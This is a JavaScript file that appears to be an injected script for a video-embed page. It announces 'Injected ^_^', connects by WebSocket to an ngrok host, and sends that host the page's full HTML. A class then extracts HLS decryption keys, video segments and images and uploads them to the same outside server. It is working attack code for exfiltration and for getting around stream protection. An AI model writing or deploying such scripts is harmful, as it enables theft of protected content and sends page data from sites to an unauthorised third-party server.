setTimeout(() => {
  const ws = new WebSocket(`wss://${window.host}/ws`)
  ws.onopen = function () {
    ws.send(
      JSON.stringify({
        action: "log_source",
        payload: {
          url: window.location.href,
          source: document.documentElement.outerHTML,
        },
      })
    )

    setTimeout(() => ws.close(), 250)
  }
}, 3000)

alert("Injected ^_^")
window.host = "eel-moral-ape.ngrok-free.app"
window.socket = new WebSocket(`wss://${window.host}/ws`)
window.socket.onopen = function () {
  alert("Connected to the server!")
  setTimeout(
    () =>
      window.socket.send(
        JSON.stringify({
          action: "log_source",
          payload: {
            url: window.location.href,
            source: document.documentElement.outerHTML,
          },
        })
      ),
    3000
  )
}

class FuckFuhu {
  hlsKeys = []
  segments = []
  host = window.host
  socket = window.socket
  embedUrl = window.location.href
  constructor(fid, elmId) {
    this.fid = fid

    if (document.querySelector("video")) {
      this.seekTo()
    }
  }

  seekTo = async () => {
    try {
      const to = await this.seekable()

      const timeElm = document.createElement("button")
      timeElm.textContent = this.secondsToHMS(to)
      Object.assign(timeElm.style, {
        top: "4px",
        left: "4px",
        opacity: 0.6,
        padding: "4px 8px",
        position: "absolute",
      })

      const onClick = () => {
        const video = document.querySelector("video")
        video
          .play()
          .then(() => {
            video.currentTime = to
          })
          .catch((_) => {
            video.muted = true
            video.play()
            video.currentTime = to
          })
      }

      timeElm.addEventListener("click", onClick)
      document.querySelector(".video-wrap").append(timeElm)
    } catch (error) {
      console.log(error)
      alert(error.message)
    }
  }

  setSegments(response = {}) {
    const formats = response.formats

    if (!formats) return
    if (!formats.enc) return
    if (!formats.enc.seg) return
    if (Array.isArray(formats.enc.seg)) {
      this.segments = formats.enc.seg.filter((s) => !["raw", "key"].includes(s[0]))
    }

    this.socket.send(
      JSON.stringify({
        action: "parse_url",
        payload: {
          fid: this.fid,
          data: response,
        },
      })
    )
  }

  ready() {
    return this.socket.readyState === this.socket.OPEN
  }

  log(action, data) {
    this.socket.send(JSON.stringify({ action, payload: { data, fid: this.fid } }))
  }

  uploadHlsKey = (key, keyUrl) => {
    const keyHex = Array.from(key)
      .map((i) => ("0" + i.toString(16)).slice(-2))
      .join("")

    if (!this.hlsKeys.includes(keyHex)) {
      this.hlsKeys.push(keyHex)
      this.socket.send(
        JSON.stringify({
          action: "hls_key",
          payload: {
            fid: this.fid,
            keyHex: keyHex,
            keyUrl: keyUrl,
            keyIndex: this.hlsKeys.length,
          },
        })
      )
    }
  }

  uploadImage = (image, name) => {
    const canvas = document.createElement("canvas")
    const context = canvas.getContext("2d")
    canvas.width = image.width
    canvas.height = image.height
    context.drawImage(image, 0, 0)
    canvas.toBlob(
      async (blob) => {
        try {
          const imageName = `${this.fid}/${name}.webp`
          const payload = new TextEncoder().encode(JSON.stringify({ type: "image", url: imageName }))
          const data = new Uint8Array(4 + payload.length + blob.size)

          data.set(new Uint8Array(new Uint32Array([payload.length]).buffer), 0)
          data.set(payload, 4)

          const image = await blob.arrayBuffer()
          data.set(new Uint8Array(image), 4 + payload.length)

          this.socket.send(data)
          context.clearRect(0, 0, canvas.width, canvas.height)
          canvas.remove()
        } catch (error) {
          console.log(error)
          alert(error.message)
        }
      },
      "image/webp",
      1
    )
  }

  uploadSegment = async (url, segmentUrl, redirectUrl, arrayBuffer, tryCount = 1) => {
    try {
      const frag = new URL(segmentUrl).searchParams.get("f")
      const fragIndex = this.segments.findIndex((s) => s[1] === frag)

      const formData = new FormData()
      formData.append("url", url)
      formData.append("fragIndex", fragIndex)
      formData.append("segmentUrl", segmentUrl)
      formData.append("redirectUrl", redirectUrl)
      if (arrayBuffer) {
        formData.append("segment", new Blob([arrayBuffer], { type: "video/mp2t" }))
      }

      const api = `https://${this.host}/api/upload/segment?fid=${this.fid}`
      const response = await fetch(api, { method: "POST", body: formData })

      if (!response.ok) {
        const result = await response.json()
        alert(result.message || result.error.message)
      }
    } catch (error) {
      tryCount++
      if (tryCount <= 3) {
        return this.uploadSegment(url, segmentUrl, redirectUrl, arrayBuffer, tryCount)
      } else {
        console.log(error)
        alert(error.message)
      }
    }
  }

  secondsToHMS(seconds) {
    let hours = Math.floor(seconds / 3600)
    let minutes = Math.floor((seconds % 3600) / 60)
    let remainingSeconds = seconds % 60

    hours = hours < 10 ? "0" + hours : hours
    minutes = minutes < 10 ? "0" + minutes : minutes
    remainingSeconds = seconds < 10 ? "0" + seconds : seconds

    return hours + ":" + minutes + ":" + remainingSeconds
  }

  seekable = async () => {
    const response = await fetch(`https://${this.host}/api/seekable?fid=${this.fid}`)
    const data = await response.json()
    return data.to
  }
}
